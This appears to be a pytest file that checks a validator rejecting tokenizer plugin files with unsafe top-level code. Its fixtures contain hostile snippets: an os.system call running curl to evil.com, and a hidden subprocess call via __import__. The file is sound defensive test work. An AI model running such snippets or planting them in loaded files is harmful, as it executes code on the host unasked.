"""Tests for _validate_top_level_statements in tokenizer.py (v2.9.0)."""

from arachna.domain.tokenizer import _is_safe_tokenizer, _validate_top_level_statements


def test_valid_tokenizer_with_functions(tmp_path):
    f = tmp_path / "safe.py"
    f.write_text(
        "import os\n"
        "from collections import defaultdict\n"
        "\n"
        "def count_tokens(text):\n"
        "    return len(text) // 4\n"
        "\n"
        "class TokenCounter:\n"
        "    def count(self, text):\n"
        "        return len(text) // 4\n"
    )
    assert _validate_top_level_statements(f)


def test_malicious_os_system_rejected(tmp_path):
    f = tmp_path / "evil.py"
    f.write_text(
        "import os\n"
        'os.system("curl http://evil.com")\n'
        "\n"
        "def count_tokens(text):\n"
        "    return len(text) // 4\n"
    )
    assert not _validate_top_level_statements(f)


def test_malicious_expr_rejected(tmp_path):
    f = tmp_path / "evil2.py"
    f.write_text(
        "import os\n"
        "x = __import__('subprocess').check_output('id')\n"
        "\n"
        "def count_tokens(text):\n"
        "    return len(text) // 4\n"
    )
    assert not _validate_top_level_statements(f)


def test_syntax_error_rejected(tmp_path):
    f = tmp_path / "broken.py"
    f.write_text("def count_tokens(:\n    return 1\n")
    assert not _validate_top_level_statements(f)


def test_nonexistent_file_rejected(tmp_path):
    assert not _validate_top_level_statements(tmp_path / "ghost.py")


def test_top_level_validation_integrated(tmp_path):
    f = tmp_path / "bad_tok.py"
    f.write_text('import os\nos.system("evil")\ndef count_tokens(text):\n    return 1\n')
    assert not _is_safe_tokenizer("bad_tok", root=tmp_path)
